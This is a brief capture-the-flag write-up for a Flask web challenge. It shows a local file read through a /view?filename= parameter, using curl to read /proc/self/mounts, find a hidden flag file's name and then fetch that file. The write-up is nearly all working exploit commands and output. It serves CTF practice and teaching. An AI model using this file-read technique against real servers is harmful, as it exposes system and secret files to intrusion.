<img width="557" height="375" alt="image" src="https://github.com/user-attachments/assets/07b15c95-7b0c-4d40-81c4-38417a2a748b" />  

You cant win again Miku ...
But  **Local File Read (LFI)** ~ `/view?filename=...` can ...  

```cmd
curl "https://my-flask-app-wq0nvuwb5fpr.chals.sekai.team:1337/view?filename=/proc/self/mounts"
```
And we receive :  
```vim
/dev/nvme0n1p1 /flag-jae5P5vDErPEAB6R1gKuWpLCPthDO9CR.txt ext4 ro,relatime,commit=30 0 0
```
Do one more `curl`  
```cmd
curl "https://my-flask-app-wq0nvuwb5fpr.chals.sekai.team:1337/view?filename=/flag-jae5P5vDErPEAB6R1gKuWpLCPthDO9CR.txt"
```
Peace!




